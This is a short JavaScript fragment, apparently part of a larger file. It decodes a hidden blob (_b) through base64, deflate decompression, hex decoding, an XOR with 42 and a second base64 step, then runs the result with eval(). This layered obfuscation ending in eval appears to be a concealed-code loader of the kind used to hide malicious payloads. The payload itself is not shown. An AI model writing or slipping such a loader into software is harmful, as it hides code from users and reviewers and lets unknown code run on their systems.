        const _inflate = new Uint8Array(atob(_b).split('').map(c=>c.charCodeAt(0)));
        (async function(){
            const blob = new Blob([_inflate]);
            const ds = new DecompressionStream('deflate');
            const decompressedStream = blob.stream().pipeThrough(ds);
            const reader = decompressedStream.getReader();
            let chunks = [];
            while(true){
                const {done, value} = await reader.read();
                if(done) break;
                chunks.push(value);
            }
            const totalLength = chunks.reduce((acc, chunk) => acc + chunk.length, 0);
            const result = new Uint8Array(totalLength);
            let offset = 0;
            for(const chunk of chunks){
                result.set(chunk, offset);
                offset += chunk.length;
            }
            const hex = new TextDecoder().decode(result);
            const codes = [];
            for(let i=0; i<hex.length; i+=2){
                codes.push(parseInt(hex.substr(i,2), 16) ^ 42);
            }
            const b64 = String.fromCharCode(...codes);
            const core = atob(b64);
            eval(core);
        })();
